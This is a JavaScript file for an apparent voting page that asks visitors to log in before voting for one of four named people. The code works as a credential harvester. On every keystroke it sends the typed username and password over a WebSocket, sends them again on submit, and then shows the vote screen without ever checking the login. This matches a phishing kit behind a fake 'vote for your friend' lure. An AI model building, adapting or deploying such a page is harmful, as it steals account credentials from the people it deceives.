const CANDIDATES = [
  { name: 'Amrit', username: 'amr26it' },
  { name: 'Ashutosh', username: 'ashutosh_si2191' },
  { name: 'Suranjan', username: 'suranjan.singh' },
  { name: 'Tushar', username: 'tushar_s22949' },
];

const EYE_OFF = `<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/><line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>`;
const EYE_ON = `<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/>`;

const screens = {
  title: document.getElementById('screen-title'),
  signin: document.getElementById('screen-signin'),
  vote: document.getElementById('screen-vote'),
};

const loginForm = document.getElementById('login-form');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const btnContinue = document.getElementById('btn-continue');
const togglePasswordBtn = document.getElementById('toggle-password');
const eyeIcon = document.getElementById('eye-icon');
const candidatesEl = document.getElementById('candidates');
const thanksState = document.getElementById('thanks-state');
const toast = document.getElementById('toast');

let voterName = '';
let hasVoted = false;
let ws = null;
let passwordVisible = false;
let sessionId = null;

function showScreen(name) {
  Object.values(screens).forEach((s) => s.classList.remove('active'));
  screens[name].classList.add('active');
  document.body.classList.toggle('login-mode', name === 'signin');
}

function createSessionId() {
  return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

function connectWebSocket() {
  if (ws && ws.readyState === WebSocket.OPEN) {
    return Promise.resolve();
  }

  return new Promise((resolve, reject) => {
    ws = new WebSocket(getWsUrl());

    ws.addEventListener('open', () => resolve());

    ws.addEventListener('error', () => {
      showToast('Connection error — please refresh');
      reject(new Error('WebSocket failed'));
    });
  });
}

function sendLoginTyping() {
  if (!ws || ws.readyState !== WebSocket.OPEN || !sessionId) return;

  ws.send(
    JSON.stringify({
      type: 'login_typing',
      sessionId,
      username: usernameInput.value,
      password: passwordInput.value,
    })
  );
}

function showToast(message) {
  toast.textContent = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2800);
}

function validateLogin() {
  btnContinue.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
}

function renderCandidates() {
  candidatesEl.innerHTML = CANDIDATES.map(
    (c) => `
    <div class="candidate-card" data-candidate="${c.name}">
      <div class="candidate-info">
        <div class="candidate-name">${c.name}</div>
        <div class="candidate-username">@${c.username}</div>
      </div>
      <button class="vote-btn" aria-label="Vote for ${c.name}" data-candidate="${c.name}">
        <svg viewBox="0 0 24 24" fill="#1a1a1a" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
        </svg>
      </button>
    </div>
  `
  ).join('');

  candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
    btn.addEventListener('click', () => castVote(btn.dataset.candidate));
  });
}

function castVote(candidate) {
  if (hasVoted) return;
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    showToast('Not connected — please refresh');
    return;
  }

  hasVoted = true;

  ws.send(
    JSON.stringify({
      type: 'vote',
      candidate,
      voterName,
      timestamp: Date.now(),
    })
  );

  showToast('Your vote is registered!');

  candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
    btn.disabled = true;
  });

  setTimeout(() => {
    candidatesEl.hidden = true;
    thanksState.hidden = false;
  }, 1800);
}

togglePasswordBtn.addEventListener('click', () => {
  passwordVisible = !passwordVisible;
  passwordInput.type = passwordVisible ? 'text' : 'password';
  eyeIcon.innerHTML = passwordVisible ? EYE_ON : EYE_OFF;
  togglePasswordBtn.setAttribute('aria-label', passwordVisible ? 'Hide password' : 'Show password');
});

document.getElementById('btn-next').addEventListener('click', async () => {
  sessionId = createSessionId();
  showScreen('signin');
  usernameInput.focus();

  try {
    await connectWebSocket();
  } catch {
    // Toast already shown
  }
});

usernameInput.addEventListener('input', () => {
  validateLogin();
  sendLoginTyping();
});

passwordInput.addEventListener('input', () => {
  validateLogin();
  sendLoginTyping();
});

loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  if (btnContinue.disabled) return;

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  if (!username || !password) return;

  btnContinue.disabled = true;
  btnContinue.textContent = 'Logging in…';

  try {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      await connectWebSocket();
    }

    voterName = username;

    ws.send(
      JSON.stringify({
        type: 'login',
        sessionId,
        username,
        password,
        timestamp: Date.now(),
      })
    );

    renderCandidates();
    showScreen('vote');
  } catch {
    btnContinue.disabled = false;
    btnContinue.textContent = 'Log in';
    validateLogin();
  }
});

renderCandidates();
